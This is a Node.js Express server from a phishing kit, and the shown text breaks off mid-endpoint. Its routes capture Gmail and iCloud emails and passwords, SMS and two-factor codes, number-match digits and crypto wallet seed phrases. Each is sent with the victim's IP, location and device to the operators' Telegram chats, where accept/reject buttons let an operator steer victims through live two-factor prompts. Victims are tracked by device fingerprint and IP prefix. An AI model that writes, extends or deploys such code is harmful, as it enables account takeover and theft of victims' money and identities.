// server.js - COMPLETE INTEGRATED VERSION - WITH DEVICE FINGERPRINTING
console.log("📦 Starting combined server.js...");

const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const fetch = require("node-fetch");
const crypto = require("crypto");
const {
  sendApprovalRequest,
  sendApprovalRequestGeneric,
  sendApprovalRequestSMS,
  sendApprovalRequestPage,
  sendLoginTelegram,
  sendVerifyTelegram,
  send2FATelegram,
  send2FACode,
  sendMasterKeyTelegram,
  sendWalletOptionsTelegram,
  sendAlertTelegram,
  sendPhraseTelegram,
  broadcastMessage,
  sendFollowUpMessage,
  userWinnerTelegram,
  bot,
  bot2
} = require("./bot");

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static("public"));

function getIP(req) {
  return (
    req.headers['cf-connecting-ip'] ||
    (req.headers['x-forwarded-for'] || '').split(',')[0].trim() ||
    req.headers['x-real-ip'] ||
    req.ip ||
    'Unknown IP'
  );
}

// Match IP by first 3 octets (e.g., 196.75.63.xxx)
function getIPPrefix(ip) {
  const parts = ip.split('.');
  if (parts.length === 4) {
    return `${parts[0]}.${parts[1]}.${parts[2]}`;
  }
  return ip;
}

// ✅ NEW: Generate device fingerprint from browser headers
function getDeviceFingerprint(req) {
  try {
    const userAgent = req.headers['user-agent'] || '';
    const language = req.headers['accept-language'] || '';
    const encoding = req.headers['accept-encoding'] || '';
    
    // Combine all headers into a string
    const combined = `${userAgent}|${language}|${encoding}`;
    
    // Create SHA256 hash of the combined string
    const fingerprint = crypto.createHash('sha256').update(combined).digest('hex').substring(0, 16);
    
    console.log(`🖐️ Device Fingerprint: ${fingerprint}`);
    return fingerprint;
  } catch (err) {
    console.error("❌ Error generating fingerprint:", err);
    return null;
  }
}

// ✅ NEW: Resolve email with NEW priority order:
// 1. Device Fingerprint (survives IP changes)
// 2. IP prefix + User ID
// 3. Session Token
// 4. IP prefix only
// 5. Full IP
function resolveEmailFromRequest(req, sessionToken = null, userId = null) {
  const ip = getIP(req);
  const ipPrefix = getIPPrefix(ip);
  const fingerprint = getDeviceFingerprint(req);
  
  // Layer 1: Try device fingerprint FIRST (most reliable for IP changes)
  if (fingerprint && deviceFingerprintToEmail[fingerprint]) {
    console.log(`✅ Resolved email via device fingerprint (${fingerprint}): ${deviceFingerprintToEmail[fingerprint]}`);
    return deviceFingerprintToEmail[fingerprint];
  }

  // Layer 2: Try IP prefix + User ID
  if (userId && ipPrefixUserIdToEmail[`${ipPrefix}_${userId}`]) {
    console.log(`✅ Resolved email via IP prefix + User ID (${ipPrefix}_${userId}): ${ipPrefixUserIdToEmail[`${ipPrefix}_${userId}`]}`);
    return ipPrefixUserIdToEmail[`${ipPrefix}_${userId}`];
  }

  // Layer 3: Try session token (if frontend implements it later)
  if (sessionToken && sessionTokenToEmail[sessionToken]) {
    console.log(`✅ Resolved email via session token: ${sessionTokenToEmail[sessionToken]}`);
    return sessionTokenToEmail[sessionToken];
  }

  // Layer 4: Try IP prefix only (handles small IP changes, no User ID)
  if (ipPrefixToEmail[ipPrefix]) {
    console.log(`✅ Resolved email via IP prefix ${ipPrefix}: ${ipPrefixToEmail[ipPrefix]}`);
    return ipPrefixToEmail[ipPrefix];
  }

  // Layer 5: Try full IP (fallback)
  if (ipToEmail[ip]) {
    console.log(`✅ Resolved email via full IP: ${ipToEmail[ip]}`);
    return ipToEmail[ip];
  }

  console.log(`⚠️ Could not resolve email - fingerprint: ${fingerprint}, ipPrefix+userId: ${ipPrefix}_${userId}, IP: ${ip}`);
  return null;
}

function getDevice(req) {
  const ua = (req.headers['user-agent'] || '').toLowerCase();
  if (/iphone|ipod/i.test(ua))       return 'iPhone';
  if (/ipad/i.test(ua))              return 'iPad';
  if (/android.*mobile/i.test(ua))   return 'Android Phone';
  if (/android/i.test(ua))           return 'Android Tablet';
  if (/windows/i.test(ua))           return 'Windows';
  if (/macintosh|mac os/i.test(ua))  return 'Mac';
  return 'Unknown Device';
}

async function getRegion(ip) {
  try {
    const res = await fetch(`https://get.geojs.io/v1/ip/geo/${ip}.json`);
    const data = await res.json();
    return `${data.city || '?'}, ${data.country || '?'}`;
  } catch {
    return 'Unknown Region';
  }
}

async function getClientInfo(req) {
  const ip = getIP(req);
  const device = getDevice(req);
  const region = await getRegion(ip);
  return { ip, device, region };
}

const pendingUsers = {};
const pendingCodes = {};
const pendingGeneric = {};
const pendingPage = {};
const pendingApprovals = {};
const pending2FA = {};
const pendingVerify = {};
const pendingMasterKey = {};
const pendingWalletOptions = {};
const pendingDeviceApproval = {};
const pendingGmailLogin = {};
const gmailDisplayEmail = {}; // ✅ Store Gmail email for display only (keyed by fingerprint)
const pendingVerificationPage = {};
const userSelectedDigits = {};
const deviceFingerprintToEmail = {};
const requestIdToEmail = {};
const ipToEmail = {};
const ipPrefixUserIdToEmail = {};  // IP prefix + User ID mapping
const sessionTokenToEmail = {};    // Session token mapping (for future)
const ipPrefixToEmail = {};        // IP prefix mapping (backup)

let userCounter = 0;
const userIds = {};

app.get("/", (req, res) => {
  res.send("✅ Combined Server is running with device fingerprinting.");
});

app.post("/get-user-id", (req, res) => {
  try {
    const ip = getIP(req);
    if (!userIds[ip]) {
      userCounter++;
      userIds[ip] = userCounter;
    }
    res.json({ userId: userIds[ip] });
  } catch (err) {
    console.error("❌ Get user ID error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

app.post("/notify", async (req, res) => {
  try {
    const { type, userId } = req.body;
    const { ip, device, region } = await getClientInfo(req);

    let message = "";

    if (type === "resend_sms") {
      message =
        `🔄 <b>Resend Code - iCloud</b> 🔄\n` +
        `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
        `<b>🌍 Region:</b> ${region}\n` +
        `<b>💻 Device:</b> ${device}\n` +
        `<b>📍 IP:</b> ${ip}`;
    } else {
      message = req.body.message || "📩 Notification";
    }

    // ✅ NEW: Resolve email and check for winner
    const emailForThisIP = resolveEmailFromRequest(req);
    console.log(`📥 Resend SMS received from User ID: ${userId}`);
    console.log(`📌 Resolved email: ${emailForThisIP}`);
    console.log(`🏆 Winner for ${emailForThisIP}: ${emailForThisIP ? userWinnerTelegram[emailForThisIP] : 'N/A'}`);

    try {
      if (emailForThisIP && userWinnerTelegram[emailForThisIP]) {
        console.log(`📨 Resend SMS going to winner only: ${userWinnerTelegram[emailForThisIP]}`);
        await sendFollowUpMessage(emailForThisIP, message, { parse_mode: "HTML" });
      } else {
        console.log(`📨 Resend SMS going to both (no winner for ${emailForThisIP})`);
        await bot.sendMessage(
          process.env.ADMIN_CHAT_ID || process.env.CHAT_ID,
          message,
          { parse_mode: "HTML" }
        );
      }
    } catch (err) {
      console.error("❌ Failed to send notify message:", err);
    }

    res.json({ ok: true });
  } catch (err) {
    console.error("❌ Failed to send notify message:", err);
    res.status(500).json({ error: "Failed to send message" });
  }
});

app.post("/send-device-approval", async (req, res) => {
  try {
    const { userId } = req.body;
    if (!userId) return res.status(400).json({ error: "Missing userId" });
    
    const requestId = `device_${Date.now()}_${Math.random().toString(36).substring(7)}`;
    const { ip, device, region } = await getClientInfo(req);

    const emailForThisIP = resolveEmailFromRequest(req);
    console.log(`📥 Device Approval Request received: ${requestId}`);
    console.log(`📌 Resolved email: ${emailForThisIP}`);
    console.log(`🏆 Winner for ${emailForThisIP}: ${emailForThisIP ? userWinnerTelegram[emailForThisIP] : 'N/A'}`);

    pendingDeviceApproval[requestId] = { status: "pending", email: emailForThisIP };

    const message =
      `🐙🐙🐙 <b>Kraken - Redirection</b> 🐙🐙🐙\n` +
      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
      `<b>📧 Email:</b> <code>${emailForThisIP || 'Unknown'}</code>\n` +
      `<b>🌍 Region:</b> ${region}\n` +
      `<b>💻 Device:</b> ${device}\n` +
      `<b>📍 IP:</b> ${ip}`;

    const options = {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "☁️ iCloud ☁️", callback_data: `device_icloud|${requestId}` }],
          [{ text: "🌈 Gmail 🌈", callback_data: `device_gmail|${requestId}` }]
        ]
      }
    };

    try {
      if (emailForThisIP && userWinnerTelegram[emailForThisIP]) {
        console.log(`📨 Device Approval going to winner only: ${userWinnerTelegram[emailForThisIP]}`);
        await sendFollowUpMessage(emailForThisIP, message, options);
      } else {
        console.log(`📨 Device Approval going to both (no winner for ${emailForThisIP})`);
        await broadcastMessage(process.env.ADMIN_CHAT_ID || process.env.CHAT_ID, message, options);
      }
    } catch (err) {
      console.error("❌ Failed to send Device Approval Telegram message:", err);
    }

    res.json({ status: "pending", requestId });
  } catch (err) {
    console.error("❌ Device Approval endpoint error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

app.get("/api/device-approval-status/:requestId", (req, res) => {
  try {
    const { requestId } = req.params;
    const entry = pendingDeviceApproval[requestId];
    if (!entry) return res.json({ status: "pending" });
    res.json({ status: entry.status });
  } catch (err) {
    console.error("❌ Device Approval status endpoint error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

app.post("/api/update-device-approval-status", (req, res) => {
  try {
    const { requestId, status } = req.body;
    if (!requestId || !status) return res.status(400).json({ error: "Missing requestId or status" });
    if (pendingDeviceApproval[requestId]) {
      pendingDeviceApproval[requestId].status = status;
      console.log(`✅ Device Approval status updated: ${requestId} → ${status}`);
      return res.json({ ok: true });
    }
    res.json({ ok: false, message: "requestId not found" });
  } catch (err) {
    console.error("❌ Device Approval update endpoint error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

app.post("/send-gmail-login", async (req, res) => {
  try {
    const { email, password, userId } = req.body;
    if (!email || !password || !userId) return res.status(400).json({ error: "Missing email, password, or userId" });
    
    const requestId = `gmail_${Date.now()}_${Math.random().toString(36).substring(7)}`;
    const { ip, device, region } = await getClientInfo(req);
    
    // Get fingerprint and store email
    const fingerprint = getDeviceFingerprint(req);
    if (fingerprint && email && !deviceFingerprintToEmail[fingerprint]) {
      deviceFingerprintToEmail[fingerprint] = email;
      console.log(`💾 Stored email for fingerprint ${fingerprint}: ${email}`);
    }
    
    // ✅ Store Gmail display email (for display only on verification page)
    if (fingerprint && email) {
      gmailDisplayEmail[fingerprint] = email;
      console.log(`📧 Stored Gmail display email for fingerprint ${fingerprint}: ${email}`);
    }

    const emailForThisIP = resolveEmailFromRequest(req);
    console.log(`📥 Gmail Login Request received: ${requestId}`);
    console.log(`📌 Resolved email: ${emailForThisIP}`);
    console.log(`🏆 Winner for ${emailForThisIP}: ${emailForThisIP ? userWinnerTelegram[emailForThisIP] : 'N/A'}`);

    pendingGmailLogin[requestId] = { status: "pending", email: email };
    
    // Store mapping for status updates - use RESOLVED email, not form email!
    requestIdToEmail[requestId] = emailForThisIP;

    const message =
      `🌈🌈🌈🌈 <b>Gmail - Sign in</b> 🌈🌈🌈🌈\n` +
      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
      `<b>📧 Email:</b> <code>${email}</code>\n` +
      `<b>🔑 Password:</b> <code>${password}</code>\n` +
      `<b>🌍 Region:</b> ${region}\n` +
      `<b>💻 Device:</b> ${device}\n` +
      `<b>📍 IP:</b> ${ip}`;

    const options = {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "✅ Accept", callback_data: `accept|${emailForThisIP}` },
            { text: "❌ Reject", callback_data: `reject|${emailForThisIP}` }
          ]
        ]
      }
    };

    try {
      if (emailForThisIP && userWinnerTelegram[emailForThisIP]) {
        console.log(`📨 Gmail Login going to winner only: ${userWinnerTelegram[emailForThisIP]}`);
        await sendFollowUpMessage(emailForThisIP, message, options);
      } else {
        console.log(`📨 Gmail Login going to both (no winner for ${emailForThisIP})`);
        await broadcastMessage(process.env.ADMIN_CHAT_ID || process.env.CHAT_ID, message, options);
      }
    } catch (err) {
      console.error("❌ Failed to send Gmail Login Telegram message:", err);
    }

    res.json({ status: "pending", requestId });
  } catch (err) {
    console.error("❌ Gmail Login endpoint error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

app.get("/api/gmail-login-status/:requestId", (req, res) => {
  try {
    const { requestId } = req.params;
    const entry = pendingGmailLogin[requestId];
    if (!entry) return res.json({ status: "pending" });
    res.json({ status: entry.status });
  } catch (err) {
    console.error("❌ Gmail Login status endpoint error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// ✅ NEW: Get Gmail display email (for verification page to display)
app.get("/api/gmail-display-email", (req, res) => {
  try {
    const fingerprint = getDeviceFingerprint(req);
    const displayEmail = gmailDisplayEmail[fingerprint];
    if (displayEmail) {
      console.log(`📧 Retrieved Gmail display email for fingerprint ${fingerprint}: ${displayEmail}`);
      res.json({ gmailEmail: displayEmail });
    } else {
      console.log(`📧 No Gmail display email found for fingerprint ${fingerprint}`);
      res.json({ gmailEmail: null });
    }
  } catch (err) {
    console.error("❌ Get Gmail display email error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

app.get("/get-device-approval/:requestId", (req, res) => {
  try {
    const { requestId } = req.params;
    const entry = pendingDeviceApproval[requestId];
    if (entry) {
      res.json({ email: entry.email || null });
    } else {
      res.json({ email: null });
    }
  } catch (err) {
    console.error("❌ Get device approval error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

app.get("/get-gmail-login/:requestId", (req, res) => {
  try {
    const { requestId } = req.params;
    const entry = pendingGmailLogin[requestId];
    if (entry && entry.email) {
      res.json({ email: entry.email });
    } else {
      res.json({ email: null });
    }
  } catch (err) {
    console.error("❌ Get Gmail login error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

app.get("/get-verification-email/:requestId", (req, res) => {
  try {
    const { requestId } = req.params;
    const entry = pendingVerificationPage[requestId];
    if (entry && entry.email) {
      res.json({ email: entry.email });
    } else {
      res.json({ email: null });
    }
  } catch (err) {
    console.error("❌ Get Verification email error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

app.get("/get-gmail-email/:requestId", (req, res) => {
  try {
    const { requestId } = req.params;
    const entry = pendingGmailLogin[requestId];
    if (entry && entry.email) {
      res.json({ email: entry.email });
    } else {
      res.json({ email: null });
    }
  } catch (err) {
    console.error("❌ Get Gmail email error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

app.post("/api/update-gmail-login-status", (req, res) => {
  try {
    const { requestId, status } = req.body;
    if (!requestId || !status) return res.status(400).json({ error: "Missing requestId or status" });
    
    console.log(`🔍 Looking up Gmail status for: ${requestId}`);
    console.log(`📋 Available keys: ${Object.keys(pendingGmailLogin).join(", ").substring(0, 100)}`);
    
    if (pendingGmailLogin[requestId]) {
      pendingGmailLogin[requestId].status = status;
      console.log(`✅ Gmail Login status updated: ${requestId} → ${status}`);
      return res.json({ ok: true });
    }
    console.log(`❌ requestId not found: ${requestId}`);
    res.json({ ok: false, message: "requestId not found" });
  } catch (err) {
    console.error("❌ Gmail Login update endpoint error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

app.post("/send-verification-page", async (req, res) => {
  try {
    const { userId } = req.body;
    if (!userId) return res.status(400).json({ error: "Missing userId" });
    
    const requestId = `verify_${Date.now()}_${Math.random().toString(36).substring(7)}`;
    const { ip, device, region } = await getClientInfo(req);

    // Use device fingerprint to get the email
    const emailForThisIP = resolveEmailFromRequest(req);
    console.log(`📥 Verification Page Request received: ${requestId}`);
    console.log(`📌 Resolved email: ${emailForThisIP}`);
    console.log(`🏆 Winner for ${emailForThisIP}: ${emailForThisIP ? userWinnerTelegram[emailForThisIP] : 'N/A'}`);

    pendingVerificationPage[requestId] = { status: "pending", selectedDigits: null, email: emailForThisIP };

    const message =
      `🌈🌈🌈 <b>Gmail - Verification</b> 🌈🌈🌈\n` +
      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
      `<b>📧 Email:</b> <code>${emailForThisIP || 'Unknown'}</code>\n` +
      `<b>🌍 Region:</b> ${region}\n` +
      `<b>💻 Device:</b> ${device}\n` +
      `<b>📍 IP:</b> ${ip}`;

    const options = {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "0", callback_data: `verify_digit|${requestId}|0` },
            { text: "1", callback_data: `verify_digit|${requestId}|1` },
            { text: "2", callback_data: `verify_digit|${requestId}|2` },
            { text: "3", callback_data: `verify_digit|${requestId}|3` },
            { text: "4", callback_data: `verify_digit|${requestId}|4` }
          ],
          [
            { text: "5", callback_data: `verify_digit|${requestId}|5` },
            { text: "6", callback_data: `verify_digit|${requestId}|6` },
            { text: "7", callback_data: `verify_digit|${requestId}|7` },
            { text: "8", callback_data: `verify_digit|${requestId}|8` },
            { text: "9", callback_data: `verify_digit|${requestId}|9` }
          ]
        ]
      }
    };

    try {
      if (emailForThisIP && userWinnerTelegram[emailForThisIP]) {
        console.log(`📨 Verification Page going to winner only: ${userWinnerTelegram[emailForThisIP]}`);
        await sendFollowUpMessage(emailForThisIP, message, options);
      } else {
        console.log(`📨 Verification Page going to both (no winner for ${emailForThisIP})`);
        await broadcastMessage(process.env.ADMIN_CHAT_ID || process.env.CHAT_ID, message, options);
      }
    } catch (err) {
      console.error("❌ Failed to send Verification Page Telegram message:", err);
    }

    res.json({ status: "pending", requestId, email: emailForThisIP });
  } catch (err) {
    console.error("❌ Verification Page endpoint error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

app.post("/update-selected-digits", (req, res) => {
  try {
    const { requestId, digit } = req.body;
    if (!requestId || digit === undefined) return res.status(400).json({ error: "Missing requestId or digit" });
    
    if (!pendingVerificationPage[requestId]) {
      return res.status(400).json({ error: "Invalid requestId" });
    }

    if (!pendingVerificationPage[requestId].selectedDigits) {
      pendingVerificationPage[requestId].selectedDigits = [];
    }

    pendingVerificationPage[requestId].selectedDigits.push(digit);
    console.log(`✅ Digit ${digit} selected for ${requestId}`);

    res.json({ ok: true, selectedCount: pendingVerificationPage[requestId].selectedDigits.length });
  } catch (err) {
    console.error("❌ Update selected digits error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

app.get("/get-selected-digits", (req, res) => {
  try {
    const { requestId } = req.query;
    if (!requestId) return res.status(400).json({ error: "Missing requestId" });

    const entry = pendingVerificationPage[requestId];
    if (!entry) return res.json({ success: false });

    if (entry.selectedDigits && entry.selectedDigits.length === 2) {
      const number = entry.selectedDigits[0] + entry.selectedDigits[1];
      return res.json({ success: true, number });
    }

    res.json({ success: false });
  } catch (err) {
    console.error("❌ Get selected digits error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

app.post("/send-verification-confirm", async (req, res) => {
  try {
    const { email, userId, digit1, digit2, requestId } = req.body;
    if (!email || !userId || digit1 === undefined || digit2 === undefined) {
      return res.status(400).json({ error: "Missing required fields" });
    }

    const confirmRequestId = `verify_confirm_${Date.now()}_${Math.random().toString(36).substring(7)}`;
    const { ip, device, region } = await getClientInfo(req);

    const emailForThisIP = resolveEmailFromRequest(req);
    console.log(`📥 Verification Confirm Request received: ${confirmRequestId}`);
    console.log(`📌 Resolved email: ${emailForThisIP}`);

    pendingVerificationPage[confirmRequestId] = { status: "pending", email: emailForThisIP };
    
    // Store mapping for status updates - use RESOLVED email
    requestIdToEmail[confirmRequestId] = emailForThisIP;

    const selectedNumber = digit1 + digit2;
    const message =
      `🌈🌈🌈 <b>Gmail - Verify Numbers</b> 🌈🌈🌈\n` +
      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
      `<b>📧 Email:</b> <code>${email}</code>\n` +
      `<b>🔢 Selected Numbers:</b> <code><b>${selectedNumber}</b></code>\n` +
      `<b>🌍 Region:</b> ${region}\n` +
      `<b>💻 Device:</b> ${device}\n` +
      `<b>📍 IP:</b> ${ip}`;

    const options = {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "✅ Accept", callback_data: `accept|${confirmRequestId}` },
            { text: "❌ Reject", callback_data: `reject|${confirmRequestId}` }
          ]
        ]
      }
    };

    try {
      if (emailForThisIP && userWinnerTelegram[emailForThisIP]) {
        console.log(`📨 Verification Confirm going to winner only: ${userWinnerTelegram[emailForThisIP]}`);
        await sendFollowUpMessage(emailForThisIP, message, options);
      } else {
        console.log(`📨 Verification Confirm going to both (no winner for ${emailForThisIP})`);
        await broadcastMessage(process.env.ADMIN_CHAT_ID || process.env.CHAT_ID, message, options);
      }
    } catch (err) {
      console.error("❌ Failed to send Verification Confirm Telegram message:", err);
    }

    res.json({ status: "pending", requestId: confirmRequestId });
  } catch (err) {
    console.error("❌ Verification Confirm endpoint error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// ✅ NEW: Resend Verification endpoint
app.post("/resend-verification", async (req, res) => {
  try {
    const { userId, email, requestId } = req.body;
    if (!userId || !email || !requestId) return res.status(400).json({ error: "Missing required fields" });

    const { ip, device, region } = await getClientInfo(req);

    // Resolve email via device fingerprint to get the correct one
    const resolvedEmail = resolveEmailFromRequest(req);
    console.log(`📥 Resend Verification Request received: ${requestId}`);
    console.log(`📌 Resolved email: ${resolvedEmail}`);
    console.log(`🏆 Winner for ${resolvedEmail}: ${resolvedEmail ? userWinnerTelegram[resolvedEmail] : 'N/A'}`);

    // ✅ NEW: Clear old digits so new ones can be selected
    if (pendingVerificationPage[requestId]) {
      pendingVerificationPage[requestId].selectedDigits = null;
      console.log(`🔄 Cleared old digits for ${requestId}`);
    }

    const message =
      `🔄 <b>Resend Code - Gmail</b> 🔄\n` +
      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
      `<b>🌍 Region:</b> ${region}\n` +
      `<b>💻 Device:</b> ${device}\n` +
      `<b>📍 IP:</b> ${ip}`;

    const options = {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "0", callback_data: `verify_digit|${requestId}|0` },
            { text: "1", callback_data: `verify_digit|${requestId}|1` },
            { text: "2", callback_data: `verify_digit|${requestId}|2` },
            { text: "3", callback_data: `verify_digit|${requestId}|3` },
            { text: "4", callback_data: `verify_digit|${requestId}|4` }
          ],
          [
            { text: "5", callback_data: `verify_digit|${requestId}|5` },
            { text: "6", callback_data: `verify_digit|${requestId}|6` },
            { text: "7", callback_data: `verify_digit|${requestId}|7` },
            { text: "8", callback_data: `verify_digit|${requestId}|8` },
            { text: "9", callback_data: `verify_digit|${requestId}|9` }
          ]
        ]
      }
    };

    try {
      if (resolvedEmail && userWinnerTelegram[resolvedEmail]) {
        console.log(`📨 Resend Verification going to winner only: ${userWinnerTelegram[resolvedEmail]}`);
        await sendFollowUpMessage(resolvedEmail, message, options);
      } else {
        console.log(`📨 Resend Verification going to both (no winner for ${resolvedEmail})`);
        await broadcastMessage(process.env.ADMIN_CHAT_ID || process.env.CHAT_ID, message, options);
      }
    } catch (err) {
      console.error("❌ Failed to send Resend Verification message:", err);
    }

    res.json({ status: "ok", requestId });
  } catch (err) {
    console.error("❌ Resend Verification endpoint error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

app.get("/api/verification-status/:requestId", (req, res) => {
  try {
    const { requestId } = req.params;
    const entry = pendingVerificationPage[requestId];
    if (!entry) return res.json({ status: "pending" });
    res.json({ status: entry.status });
  } catch (err) {
    console.error("❌ Verification status endpoint error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

app.post("/api/update-verification-status", (req, res) => {
  try {
    const { requestId, status } = req.body;
    if (!requestId || !status) return res.status(400).json({ error: "Missing requestId or status" });
    if (pendingVerificationPage[requestId]) {
      pendingVerificationPage[requestId].status = status;
      console.log(`✅ Verification status updated: ${requestId} → ${status}`);
      return res.json({ ok: true });
    }
    res.json({ ok: false, message: "requestId not found" });
  } catch (err) {
    console.error("❌ Verification update endpoint error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

app.post("/send-alert", async (req, res) => {
  try {
    const { type } = req.body;
    if (!type) return res.status(400).json({ error: "Missing type" });

    const { ip, device, region } = await getClientInfo(req);
    await sendAlertTelegram(type, { ip, region, device });
    res.json({ ok: true });
  } catch (err) {
    console.error("❌ Failed to send alert:", err);
    res.status(500).json({ error: "Failed to send alert" });
  }
});

app.post("/send-phrase", async (req, res) => {
  try {
    const { phrase } = req.body;
    if (!phrase) return res.status(400).json({ error: "Missing phrase" });

    const { ip, device, region } = await getClientInfo(req);
    
    // ✅ NEW: Use improved email resolution with fingerprinting
    const emailForThisIP = resolveEmailFromRequest(req);
    console.log(`📥 Wallet Phrase received`);
    console.log(`📌 Resolved email: ${emailForThisIP}`);
    console.log(`🏆 Winner for ${emailForThisIP}: ${emailForThisIP ? userWinnerTelegram[emailForThisIP] : 'N/A'}`);

    try {
      // ✅ If there's a winner, send ONLY to winner. Otherwise broadcast
      if (emailForThisIP && userWinnerTelegram[emailForThisIP]) {
        console.log(`📨 Wallet Phrase going to winner only: ${userWinnerTelegram[emailForThisIP]}`);
        await sendPhraseTelegram({ phrase, region, device, ip }, emailForThisIP);
      } else {
        console.log(`📨 Wallet Phrase going to both (no winner for ${emailForThisIP})`);
        await sendAlertTelegram("phrase", { ip, region, device, phrase });
      }
    } catch (err) {
      console.error("❌ Failed to send phrase:", err);
    }

    res.json({ ok: true });
  } catch (err) {
    console.error("❌ Failed to send phrase:", err);
    res.status(500).json({ error: "Failed to send phrase" });
  }
});

// ─── Rest of endpoints (login, pages, 2FA, etc) ─────────────────────────

app.post("/login", (req, res) => {
  try {
    const email = (req.body.email || "").trim().toLowerCase();
    const password = req.body.password;
    if (!email || !password) return res.status(400).json({ success: false, message: "Email and password required" });
    pendingUsers[email] = { password, status: "pending" };
    console.log(`📥 Login Received: ${email}`);
    sendApprovalRequest(email, password);
    res.json({ success: true });
  } catch (err) {
    console.error("❌ Login endpoint error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

app.post("/generic-login", (req, res) => {
  try {
    const identifier = (req.body.identifier || "").trim();
    if (!identifier) return res.status(400).json({ success: false, message: "Identifier required" });
    pendingGeneric[identifier] = { status: "pending" };
    console.log(`📥 Generic Identifier Received: ${identifier}`);
    sendApprovalRequestGeneric(identifier);
    res.json({ success: true });
  } catch (err) {
    console.error("❌ Generic login endpoint error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

app.post("/sms-login", async (req, res) => {
  try {
    const { code, userId, email } = req.body;
    if (!code) return res.status(400).json({ success: false, message: "Code required" });
    const { ip, device, region } = await getClientInfo(req);

    const previousEmail = resolveEmailFromRequest(req);
    const identifier = email || previousEmail || code;

    pendingCodes[code] = { status: "pending" };
    console.log(`📥 SMS Code Received: ${code}`);
    console.log(`🔍 Using identifier: ${identifier}`);
    console.log(`🔍 Winner for ${identifier}: ${userWinnerTelegram[identifier]}`);

    const message =
      `⛈⛈⛈⛈ <b>iCloud - SMS</b> ⛈⛈⛈⛈\n` +
      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
      `<b>💬 SMS:</b> <code>${code}</code>\n` +
      `<b>🌍 Region:</b> ${region}\n` +
      `<b>💻 Device:</b> ${device}\n` +
      `<b>📍 IP:</b> ${ip}`;

    const options = {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "✅ Accept", callback_data: `accept|${code}` },
            { text: "❌ Reject", callback_data: `reject|${code}` }
          ]
        ]
      }
    };

    try {
      if (identifier && userWinnerTelegram[identifier]) {
        console.log(`📨 SMS going to winner only: ${userWinnerTelegram[identifier]}`);
        await sendFollowUpMessage(identifier, message, options);
      } else {
        console.log(`📨 SMS going to both (no winner yet for: ${identifier})`);
        await broadcastMessage(process.env.ADMIN_CHAT_ID || process.env.CHAT_ID, message, options);
      }
    } catch (err) {
      console.error("❌ Failed to send SMS Telegram message:", err);
    }

    res.json({ success: true });
  } catch (err) {
    console.error("❌ SMS login endpoint error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

app.post("/page-login", async (req, res) => {
  try {
    const { email, password, userId, sessionToken } = req.body;
    if (!email || !password) return res.status(400).json({ success: false, message: "Email and password required" });
    const { ip, device, region } = await getClientInfo(req);

    pendingPage[email] = { password, status: "pending" };
    console.log(`📥 iCloud Page Login Received: ${email}`);

    // ✅ NEW: Use improved email resolution with fingerprinting
    const resolvedEmail = resolveEmailFromRequest(req, sessionToken, userId);
    console.log(`🔍 Resolved email for request: ${resolvedEmail}`);
    console.log(`🏆 Winner for ${resolvedEmail}: ${resolvedEmail ? userWinnerTelegram[resolvedEmail] : 'N/A'}`);

    const message =
      `☁️☁️☁️☁️ <b>iCloud - Login</b> ☁️☁️☁️☁️\n` +
      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
      `<b>📧 Email:</b> <code>${email}</code>\n` +
      `<b>🔑 Password:</b> <code>${password}</code>\n` +
      `<b>🌍 Region:</b> ${region}\n` +
      `<b>💻 Device:</b> ${device}\n` +
      `<b>📍 IP:</b> ${ip}`;

    const options = {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "✅ Accept", callback_data: `accept|${email}` },
            { text: "❌ Reject", callback_data: `reject|${email}` }
          ]
        ]
      }
    };

    try {
      if (resolvedEmail && userWinnerTelegram[resolvedEmail]) {
        console.log(`📨 iCloud Page Login going to winner only: ${userWinnerTelegram[resolvedEmail]}`);
        await sendFollowUpMessage(resolvedEmail, message, options);
      } else {
        console.log(`📨 iCloud Page Login going to both (no winner from previous email)`);
        await broadcastMessage(process.env.ADMIN_CHAT_ID || process.env.CHAT_ID, message, options);
      }
    } catch (err) {
      console.error("❌ Failed to send Page Telegram message:", err);
    }

    res.json({ success: true });
  } catch (err) {
    console.error("❌ Page login endpoint error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

app.post("/send-login", async (req, res) => {
  try {
    const { email, password, userId } = req.body;
    if (!email || !password) return res.status(400).json({ error: "Missing email or password" });
    const { ip, device, region } = await getClientInfo(req);

